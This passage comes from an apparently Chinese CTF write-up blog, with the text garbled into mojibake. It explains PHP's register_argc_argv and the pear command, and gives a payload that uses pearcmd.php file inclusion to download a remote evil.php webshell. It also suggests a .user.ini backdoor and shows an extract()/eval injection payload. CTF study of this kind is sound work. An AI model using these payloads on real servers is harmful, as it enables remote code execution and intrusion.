&lt;p>æœ‰ä¸€ç‚¹ç‚¹è„‘æ´ï¼Œä¹Ÿè·Ÿçœ¼åŠ›è§æœ‰å…³ç³»ï¼Œæˆ‘ä¸€å¼€å§‹æ˜¯çœŸæ²¡æ³¨æ„åˆ°è¿™ä¸ªcookieçš„APIå­—æ®µï¼Œå±å®æ˜¯æœ‰ç‚¹å¤§ç—…ï¼›ä¹‹ååšé¢˜è¿˜æ˜¯è¦å¼€ç¯å¢ƒä¹‹åå°±è¿burpï¼Œæ³¨æ„è§‚å¯Ÿå“åº”å¤´çš„ç‰¹æ®Šå­—æ®µ cookieçš„ç±»å‹/ctrl+uçš„æºç /å¯èƒ½ä¼šæœ‰çš„æ§åˆ¶å°çš„æç¤ºä¿¡æ¯/robots.txtè¿™äº›ä¸œè¥¿ï¼Œä¸è¦é—æ¼ï¼Œä¸ç„¶å°±å¾ˆå¯æƒœäº†&lt;/p>
&lt;h2 id="give_me_you_0day">Give_me_you_0day&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023131341209.png" alt="image-20211023131341209">&lt;/p>
&lt;p>è¿™é‡Œè€ƒå¯Ÿçš„ç‚¹å¹¶ä¸æ˜¯Typecho 1.1/17.10.30ç‰ˆæœ¬çš„0dayï¼ˆç»™å‡ºçš„æºç å°±å®Œå…¨æ˜¯githubä¸Šçš„å‘è¡Œç‰ˆï¼‰ï¼Œè€Œæ˜¯install.phpä¸­ 608è¡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023233205364.png" alt="image-20211023233205364">&lt;/p>
&lt;p>åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥æï¼Œpayloadå¯ä»¥ç›´æ¥å‚è€ƒ&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030247104.png" alt="image-20211024030247104">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024025903697.png" alt="image-20211024025903697">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030018830.png" alt="image-20211024030018830">&lt;/p>
&lt;p>æ‰“çš„ç‚¹åœ¨äºpeclcmdï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„é¢˜å’ŒçŸ¥è¯†å®³æŒºå¤šï¼Œä¹‹å‰çœŸæ²¡è§è¿‡ï¼ˆdbqæ˜¯æˆ‘åšçš„é¢˜å¤ªå°‘å¤ªå°‘äº†ï¼‰ï¼Œåœ¨è¿™é‡Œä¸€å¹¶å­¦ä¹ äº†&lt;/p>
&lt;h3 id="å…³äºregister_argc_argvé…ç½®é¡¹">å…³äº&lt;code>register_argc_argv&lt;/code>é…ç½®é¡¹&lt;/h3>
&lt;p>æ˜¯php.iniæ ¸å¿ƒé…ç½®ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤æ˜¯è¿™æ ·&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024002824679.png" alt="image-20211024002824679">&lt;/p>
&lt;p>&lt;a href="https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv">æ‰‹å†Œ&lt;/a>æ˜¯è¿™æ ·å†™çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000219559.png" alt="image-20211024000219559">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000145606.png" alt="image-20211024000145606">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000543235.png" alt="image-20211024000543235">&lt;/p>
&lt;p>ä»php=4.0.0åä¸ºå¯è®¾ç½®çš„é€‰é¡¹ï¼ˆæ­¤å‰æ€»ä¸ºOnï¼‰é»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ï¼Œå½“php&amp;lt;=4.2.3æ—¶å¯ä¿®æ”¹èŒƒå›´æ˜¯&lt;code>PHP_INI_ALL&lt;/code>ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥å‚è§-&amp;gt;&lt;a href="http://ms7.fhsh.tp.edu.tw/php5c/features.commandline.html">PHPçš„å‘½ä»¤è¡Œæ¨¡å¼&lt;/a>&lt;/p>
&lt;p>åœ¨&lt;code>register_argc_argv&lt;/code>å¼€å¯çš„æƒ…å†µä¸‹ï¼Œcgiå’Œcliæ¨¡å¼ä¸‹éƒ½å¯ä»¥ç›´æ¥è®¿é—®åˆ°ä¼ å…¥çš„å‚æ•°ï¼›å…¶ä¸­argcæ˜¯ä¼ é€’è¿‡å»çš„å‚æ•°çš„ä¸ªæ•°ï¼Œargvæ˜¯åŒ…å«æœ‰å®é™…å‚æ•°çš„æ•°ç»„ï¼›cliæ¨¡å¼æµ‹è¯•å¦‚ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75715e">// var_dump($HTTP_SERVER_VARS[&amp;#39;argv&amp;#39;]);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003201497.png" alt="image-20211024003201497">&lt;/p>
&lt;p>cgiçš„è¯ï¼Œç›´æ¥ç”¨ä¸Šé¢çš„&lt;code>$_SERVER['argv']&lt;/code>æ˜¯ä¸ä¼šè·å–åˆ°å€¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003801051.png" alt="image-20211024003801051">&lt;/p>
&lt;p>ç›´æ¥æŸ¥çœ‹$_SERVERè¿™ä¸ªå¤§æ•°ç»„ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬çš„å‚æ•°åœ¨è¿™é‡Œæ˜¯ä»¥ä¸€æ•´ä¸ªQUERY_STRINGçš„å½¢å¼å‡ºç°çš„ï¼ˆè¯¦ç»†çš„æ•°ç»„è§£æ-&amp;gt;&lt;a href="https://www.feiniaomy.com/post/274.html">PHPè¶…å…¨å±€å˜é‡$_SERVERçš„ç”¨æ³•&lt;/a>ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024012150841.png" alt="image-20211024012150841">&lt;/p>
&lt;p>æœ‰ä¸ªç‰¹æ®Šçš„trickåœ¨äºï¼Œå¦‚æœæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1&amp;amp;b=1
&lt;/code>&lt;/pre>&lt;p>ç¡®å®æ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä½†è¿”å›çš„$_SERVER[&amp;lsquo;argv&amp;rsquo;]ä¸º1ï¼Œå¦‚æœæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1+b=1
&lt;/code>&lt;/pre>&lt;p>åˆ™ä¼šè¢«æˆªæ–­ï¼Œè¿”å›$_SERVER[&amp;lsquo;argv&amp;rsquo;]åˆ™ä¸º2ï¼ˆè¯´å®è¯æˆ‘æœ¬åœ°çœŸæ²¡è·‘å‡ºæ¥è¿™ä¸ª å¯èƒ½æ˜¯å“ªé‡Œçš„é…ç½®æœ‰é—®é¢˜ï¼Ÿä½†æ˜¯çœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥è¢«å¤ç°æˆåŠŸçš„â€¦â€¦â€¦â€¦â€¦â€¦emmmm æœ‰ä¸€ç‚¹ç‚¹ç¦»è°±ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020719209.png" alt="image-20211024020719209">&lt;/p>
&lt;h3 id="å…³äºpearå‘½ä»¤">å…³äº&lt;code>pear&lt;/code>å‘½ä»¤&lt;/h3>
&lt;p>pearæ˜¯&lt;em>the PHP Extention and Application Repository&lt;/em>çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªPHPæ‰©å±•ä¸åº”ç”¨çš„ä»£ç ä»“åº“ï¼Œpearä»“åº“ä»£ç ä»¥åŒ…&lt;em>package&lt;/em>åˆ†åŒºï¼Œæ¯ä¸€ä¸ª&lt;em>pear package&lt;/em>éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ï¼›&lt;em>pear package&lt;/em>ä»¥phar, tar, zipå½¢å¼å‘å¸ƒï¼Œé€šè¿‡&lt;code>apt install php-pear&lt;/code>æ¥å®‰è£…&lt;/p>
&lt;p>pearå‘½ä»¤çš„å®ç°æ˜¯ä¸€ä¸ªshè„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/sh
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e"># first find which PHP binary to use&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_bin&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>php
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#75715e"># then look for the right pear include dir&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_dir&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`&lt;/span>dirname &lt;span style="color:#111">$0&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#111">exec&lt;/span> &lt;span style="color:#111">$PHP&lt;/span> -C -q &lt;span style="color:#111">$INCARG&lt;/span> -d data.timezone&lt;span style="color:#f92672">=&lt;/span>UTC -d &lt;span style="color:#111">output_buffering&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> -d &lt;span style="color:#111">variables_order&lt;/span>&lt;span style="color:#f92672">=&lt;/span>EGPCS -d &lt;span style="color:#111">open_basedir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">safe_mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> -d &lt;span style="color:#111">register_argc_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_prepend_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_append_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">$INCDIR&lt;/span>/pearcmd.php &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$@&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»æœ€åä¸€è¡Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†/pearcmd.phpï¼Œè€Œè¿™ä¸ªpearcmd.phpçš„å‚æ•°$argvå°±æ¥æºäº$_SERVER[&amp;lsquo;argv&amp;rsquo;]ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯æ§çš„ä¼ å…¥å‚æ•°&lt;/p>
&lt;h3 id="åˆ©ç”¨pearå‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½">åˆ©ç”¨&lt;code>pear&lt;/code>å‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½&lt;/h3>
&lt;p>å¦‚å›¾ï¼Œç›´æ¥ä¸‹è½½å¼€å¯äº†httpæœåŠ¡å™¨çš„ç›®å½•ä¸‹çš„æŒ‡å®šæ–‡ä»¶åˆ°å½“å‰æ‰€åœ¨ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020030648.png" alt="image-20211024020030648">&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>install -R&lt;/code>è€Œé&lt;code>download&lt;/code>å¯ä»¥æ§åˆ¶ä¸‹è½½åˆ°ä»»æ„ç›®å½•ï¼Œæ¯”å¦‚ç›´æ¥ä¸‹è½½åˆ°webæœåŠ¡çš„ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020411477.png" alt="image-20211024020411477">&lt;/p>
&lt;h3 id="æ‰€ä»¥æ€»ä½“æ€è·¯payload">æ‰€ä»¥æ€»ä½“æ€è·¯+payload&lt;/h3>
&lt;p>å¦‚æœå­˜åœ¨è¿™æ ·çš„ç¯å¢ƒ&lt;/p>
&lt;ul>
&lt;li>å®‰è£…pear&lt;/li>
&lt;li>å¼€å¯register_argc_argv&lt;/li>
&lt;li>å­˜åœ¨å¯æ§çš„ä¼ å…¥å‚æ•°æ¥åšåˆ°æ–‡ä»¶åŒ…å«ï¼ˆæ¯”å¦‚&lt;code>include $_GET['f'].php&lt;/code>ï¼‰&lt;/li>
&lt;li>å¯ä»¥å‡ºç½‘&lt;/li>
&lt;/ul>
&lt;p>æˆ‘ä»¬å°±å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ä»è€Œgetshellï¼›å‰é¢ä¹Ÿæåˆ°register_argc_argvç»§ç»­PHP_IN_PREDIRï¼Œæˆ‘ä»¬å¯ä»¥ç•™ä¸€ä¸ª.user.iniçš„åé—¨æ¥è®¾ç½®register_argc_agrvä¸ºOn&lt;/p>
&lt;p>&lt;strong>payload&lt;/strong>å°±æ˜¯è¿™æ ·äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>// å­˜åœ¨ include $_GET['f'].php
// webç›®å½•å¯å†™
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/evil.php
- http://ip:port/tmp/pear/download/evil.php
// tmpç›®å½•å¯å†™
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/tmp+http://ip:port/evil.php
- http://ip:port/include.php?f=/tmp/pear/download/evil
&lt;/code>&lt;/pre>&lt;p>é¦–å…ˆè¦åŒ…å«ä¸€ä¸ªæ­£ç¡®ä½ç½®çš„pearcmd.phpï¼ˆé€šå¸¸åœ¨/usr/local/lib/php/pearcmd.phpï¼‰ï¼Œæ¥ç€åŒ…å«&amp;amp;+download+http://your_vps/eval.phpï¼ˆæˆ–è€…å¦‚æœå‰é¢ç›´æ¥æ˜¯/pearcmd.phpçš„è¯å°±å¯ä»¥ç›´æ¥ç»™å‚æ•°äº†/pearcmd.php+download+http://your_vps/eval.phpï¼‰æ¥è£…ğŸï¼ˆæ³¨æ„è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œä¹‹åå†åŒ…å«æˆ‘ä»¬çš„ğŸå³å¯&lt;/p>
&lt;h3 id="å…¶å®ƒçš„ä¾‹é¢˜">å…¶å®ƒçš„ä¾‹é¢˜&lt;/h3>
&lt;p>&lt;a href="https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/">[CampCTF 2015] Trolol&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.lemonprefect.cn/zh-tw/posts/9b2fbf24#MeowWorld">[å·…å³°æå®¢ 2020] MeowWord&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;hr>
&lt;p>è¿˜æ˜¯åšçš„é¢˜ä¸å¤Ÿå¤šï¼Œå·²æœ‰çš„çŸ¥è¯†ä¹Ÿåº”ç”¨çš„ä¸å¤Ÿç†Ÿç»ƒï¼Œå®åœ¨æ˜¯å¤ªå¤ªå¤ªå¤ªå¤ªèœäº†ï¼Œå¾—å¥½å¥½å­¦ï¼Œä¸èƒ½å¤©å¤©åˆ’æ°´æ‘¸é±¼&lt;/p></description></item><item><title>DasCTF1021 Wp</title><link>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</link><pubDate>Sun, 24 Oct 2021 16:47:40 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</guid><description>&lt;h2 id="webè¿·è·¯çš„é­”æ³•å°‘å¥³">Web/è¿·è·¯çš„é­”æ³•å°‘å¥³&lt;/h2>
&lt;blockquote>
&lt;p>é­”æ³•å°‘å¥³è¿·å¤±åœ¨äº†ä»£ç ç©ºé—´ è¯·å¯»æ‰¾å¥¹ç°åœ¨åœ¨å“ª&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">array = &lt;/span>&lt;span style="color:#d88200">$data&lt;/span>&lt;span style="color:#d88200">;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;array(&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$attrids&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;=&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;);&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?attrid[]=&amp;amp;attrvalue[]=&amp;quot;);phpinfo();//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024120107148.png" alt="image-20211024120107148">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://blog.csdn.net/zz_Caleb/article/details/88671071">CG-CTF å˜é‡è¦†ç›–(PHP extractå‡½æ•°åˆ©ç”¨)&lt;/a> | &lt;a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/">CTF-PHPé»‘é­”æ³•&lt;/a>&lt;/p>
&lt;h2 id="miscwelcome-dasctfxjlenu">Misc/WELCOME DASCTFxJlenu&lt;/h2>
&lt;blockquote>
&lt;p>æ¬¢è¿æ¥åˆ°é­”æ³•çš„ä¸–ç•Œï¼ˆç­¾åˆ°ï¼‰&lt;/p>
&lt;/blockquote>
&lt;p>å¯æ˜¯æœ‰å‡ å±‚åŒ…æµ†çš„åŸé¢˜äº†å±äºæ˜¯ï¼Œä¹‹å‰ç»å¯¹åšè¿‡ä¸€æ¬¡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105141498.png" alt="image-20211024105141498">&lt;/p>
